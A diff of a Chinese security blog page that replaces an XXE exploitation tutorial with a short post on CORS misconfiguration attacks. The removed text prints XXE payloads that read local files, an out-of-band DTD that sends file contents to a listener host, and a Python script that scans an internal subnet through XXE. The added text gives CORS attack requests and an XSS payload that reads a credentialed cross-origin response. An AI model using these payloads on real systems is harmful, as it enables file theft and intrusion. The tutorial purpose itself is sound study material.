@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>理解和利用XXE - blog</title>
+  <title>CORF利用面 - blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期日, 十二月 29日 2019, 10:00 上午
+                  星期一, 十二月 2日 2019, 10:00 上午
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    1.5k 字
+                    652 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      7 分钟
+                      2 分钟
                   </span>
                 
 
@@ -168,129 +168,46 @@
         <div class="post-content mx-auto" id="post">
           
           <div class="markdown-body">
-            <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>介绍dtd，一句话说就是用来规范xml中的标签和内容（元素和属性）<br><img src="/img/xxe1.png" srcset="/img/loading.gif" alt="dtd"><br>而XXE漏洞就出现在调用dtd</p>
+            <h2 id="CORF"><a href="#CORF" class="headerlink" title="CORF"></a>CORF</h2><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p>
+<p>CORS需要浏览器和服务器同时支持。它的通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
+<p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>
+<p> http响应头</p>
 <blockquote>
-<p>&lt;!ENTITY xxe SYSTEM “file:///c:/test.dtd” &gt;  </p>
+<p>Access-Control-Allow-Origin：指定哪些域可以访问域资源。<br>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送cookie。仅当allow-credentials标头设置为true时，才会发送Cookie。<br>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET，PUT，DELETE等）来访问资源。  </p>
 </blockquote>
-<p>就像这里，调用了c盘的test.dtd来规范我们的xml，但此时换成读其他文件，就造成了安全问题。</p>
-<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="内部-外部"><a href="#内部-外部" class="headerlink" title="内部/外部"></a>内部/外部</h3><p>内部：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;
-&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p>外部：  </p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
-&lt;creds&gt;
-    &lt;user&gt;&amp;xxe;&lt;/user&gt;
-    &lt;pass&gt;mypass&lt;/pass&gt;
-&lt;/creds&gt;</code></pre><p>从外部应用dtd文件，方便资源更新。<br>也可从公共dtd引用</p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="1-利用通配符"><a href="#1-利用通配符" class="headerlink" title="1.利用通配符*"></a>1.利用通配符*</h3><p>最常见的CORS配置错误之一是错误地使用诸如（*）之类的通配符，允许域请求资源。这通常设置为默认值，这意味着任何域都可以访问此站点上的资源。例如</p>
 <blockquote>
-<p>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;  </p>
+<p>GET /api/userinfo.php<br>Host: <a href="http://www.vuln.com" target="_blank" rel="noopener">www.vuln.com</a><br>Origin: <a href="http://www.vuln.com" target="_blank" rel="noopener">www.vuln.com</a>  </p>
 </blockquote>
-<p>外部引用可支持http，file等协议，不同的语言支持的协议不同.</p>
-<h3 id="通用-参数"><a href="#通用-参数" class="headerlink" title="通用/参数"></a>通用/参数</h3><p><strong>通用实体</strong>:在dtd定义，xml引用。<br>定义：</p>
 <blockquote>
-<p>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;  </p>
+<p>HTTP/1.0 200 OK<br>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Credentials: false  </p>
 </blockquote>
-<p>引用：  </p>
+<p>响应头Access-Control-Allow-Origin: *代表任何域可以访问资源。这里的 Credentials: false<br>，如果这种请求带上cookie(withCredentials = true)，是不允许的。如果需要实现带 Cookie 的跨域请求，CORS服务端需要明确的配置允许来源的域，使用任意域的配置是不合法的。浏览器会屏蔽掉返回的结果。</p>
+<h3 id="2-服务器Access-Control-Allow-Origin等于请求的Origin"><a href="#2-服务器Access-Control-Allow-Origin等于请求的Origin" class="headerlink" title="2.服务器Access-Control-Allow-Origin等于请求的Origin"></a>2.服务器Access-Control-Allow-Origin等于请求的Origin</h3><h3 id="3-信任域通配符"><a href="#3-信任域通配符" class="headerlink" title="3.信任域通配符"></a>3.信任域通配符</h3><p>如果CORS来验证“Origin header”URL，白名单域只是“*vuln.com”</p>
 <blockquote>
-<p>&amp;实体名称；</p>
+<p>GET /api/userinfo.php<br>Host: example.com<br>Connection: close<br>Origin: attackervuln.com  </p>
 </blockquote>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; 
-&lt;updateProfile&gt;  
-    &lt;firstname&gt;Joe&lt;/firstname&gt;  
-    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  
-    ... 
-&lt;/updateProfile&gt;</code></pre><p><strong>参数实体</strong>:dtd中定义，dtd中引用<br>定义：</p>
 <blockquote>
-<p>&lt;!ENTITY % 实体名称 “实体的值”&gt;<br>&lt;!ENTITY % 实体名称 SYSTEM “URI/URL”&gt;</p>
+<p>HTTP/1.0 200 OK<br>Access-Control-Allow-Origin: attackervuln.com<br>Access-Control-Allow-Credentials: true  </p>
 </blockquote>
-<p>引用：  </p>
-<blockquote>
-<p>%实体名称；  </p>
-</blockquote>
-<p>ps：定义时%后有个空格，引用没有。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="无回显读取文件"><a href="#无回显读取文件" class="headerlink" title="无回显读取文件"></a>无回显读取文件</h3><p>test.dtd</p>
-<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
-&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>payload:</p>
-<pre><code>&lt;!DOCTYPE convert [ 
-&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
-%remote;%int;%send;
-]&gt;</code></pre><p>在攻击机上监听9999端口就能获取所读文件   </p>
-<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
-<h3 id="有回显读取特殊内容文件"><a href="#有回显读取特殊内容文件" class="headerlink" title="有回显读取特殊内容文件"></a>有回显读取特殊内容文件</h3><p>当读取当文件内容包含&lt;&gt;&amp;“之类等字符，为了不让xml解析器解析，使用CDATA去标示。此处采用参数实体。<br>evil.dtd</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
-&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>payload</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE roottag [
-&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
-&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
-&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
-&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
-%dtd; ]&gt; 
-
-&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><h3 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h3><p>可理解为ssrf，通过XXE的方式实现ssrf。</p>
-<h4 id="探测ip"><a href="#探测ip" class="headerlink" title="探测ip"></a>探测ip</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE creds [  
-&lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.0&quot;&gt; ]&gt;
-&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>根据响应时间判断存活。利用脚本或bp重放探测。<br>脚本</p>
-<pre><code>import requests
-import base64
-
-#Origtional XML that the server accepts
-#&lt;xml&gt;
-#    &lt;stuff&gt;user&lt;/stuff&gt;
-#&lt;/xml&gt;
-
-
-def build_xml(string):
-    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
-    send_xml(xml)
-
-def send_xml(xml):
-    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}
-    x = requests.post(&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;, data=xml, headers=headers, timeout=5).text
-    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value
-    print coded_string
-#   print base64.b64decode(coded_string)
-for i in range(1, 255):
-    try:
-        i = str(i)
-        ip = &#39;10.0.0.&#39; + i
-        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;
-        print string
-        build_xml(string)
-    except:
-continue</code></pre><h4 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE creds [  
-&lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:22&quot;&gt; ]&gt;
-&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><h4 id="探测内网web"><a href="#探测内网web" class="headerlink" title="探测内网web"></a>探测内网web</h4><p>1.读web源码<br>2.通过jar协议上传文件；通过ftp协议结合 CRLF 注入攻击SMTP服务器等<br>不同环境和平台可利用协议：<br><img src="/img/xxe2.png" srcset="/img/loading.gif" alt="dtd"> </p>
-<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1.文件上传解析处<br>现代Excel文件实际上只是XML文档的zip文件。这称为Office Open XML格式或OOXML。<br>许多应用程序允许上传文件。有些处理内部数据并采取相应的操作，这几乎肯定需要解析XML。如果解析器未安全配置，则XXE几乎是不可避免的。  </p>
-<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://www.freebuf.com/vuls/194489.html" target="_blank" rel="noopener">从Blind XXE漏洞到读取Root文件的系统提权</a></p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1.禁用外部实体<br>如php：<br>libxml_disable_entity_loader(true);<br>2.过滤关键字</p>
-<p>参考：<br><a href="https://xz.aliyun.com/t/3357#toc-21" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-21</a><br><a href="https://www.cnblogs.com/flokz/p/xxe.html" target="_blank" rel="noopener">https://www.cnblogs.com/flokz/p/xxe.html</a><br><a href="https://www.uedbox.com/post/28999/" target="_blank" rel="noopener">https://www.uedbox.com/post/28999/</a><br><a href="https://blog.csdn.net/q547550831/article/details/50541424" target="_blank" rel="noopener">https://blog.csdn.net/q547550831/article/details/50541424</a></p>
-<p>思考：<br>1.无回显读文件时  </p>
-<blockquote>
-<p>&lt;!ENTITY % int “&lt;!ENTITY % send SYSTEM ‘<a href="http://ip:9999?p=%file;&#39;&gt;&quot;&gt;" target="_blank" rel="noopener">http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</a>  </p>
-</blockquote>
-<p>为什么在实体中建实体，为什么</p>
-<blockquote>
-<p>&lt;!ENTITY % int “<a href="http://ip:9999?p=%file;&quot;&gt;" target="_blank" rel="noopener">http://ip:9999?p=%file;&quot;&gt;</a>   </p>
-</blockquote>
-<p>不行    </p>
-<blockquote>
-<p>定义int变量，它只是起到穿插作用，目的是编译里面的实体send；<br>在%file处访问资源，并将该位置的内容 加载到实体send。 </p>
-</blockquote>
-<p>2.xml解析和传递流程</p>
+<p>我们创建一个attackervuln.com域就能进行攻击。</p>
+<h3 id="4-利用xss"><a href="#4-利用xss" class="headerlink" title="4.利用xss"></a>4.利用xss</h3><p>如果corf做白名单限制，如果能在白名单域或其中的一个子域找到xss，就能利用。</p>
+<p>xss payload</p>
+<pre><code>&lt;script&gt;
+function cors() {  
+var xhttp = new XMLHttpRequest();  
+xhttp.onreadystatechange = function() {    
+    if (this.status == 200) {    
+    alert(this.responseText);     
+    document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;    
+    }  
+};  
+xhttp.open(&quot;GET&quot;, &quot;https://www.vuln.com/userifo.php&quot;, true);  
+xhttp.withCredentials = true;  
+xhttp.send();
+}
+cors();
+&lt;/script&gt;</code></pre><h3 id="5-浏览器解析特殊字符的URL"><a href="#5-浏览器解析特殊字符的URL" class="headerlink" title="5.浏览器解析特殊字符的URL"></a>5.浏览器解析特殊字符的URL</h3><p>此处参考：<a href="https://www.freebuf.com/articles/web/204023.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/204023.html</a></p>
 
             <hr>
           </div>
@@ -302,7 +219,7 @@ continue</code></pre><h4 id="探测端口"><a href="#探测端口" class="header
               <span>
                 <i class="iconfont icon-tag"></i>
                 
-                  <a class="hover-with-bg" href="/tags/XXE/">XXE</a>
+                  <a class="hover-with-bg" href="/tags/corf/">corf</a>
                 
               </span>
             
@@ -504,7 +421,7 @@ continue</code></pre><h4 id="探测端口"><a href="#探测端口" class="header
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "理解和利用XXE&nbsp;",
+        "CORF利用面&nbsp;",
       ],
       cursorChar: "🐶",
       typeSpeed: 70,
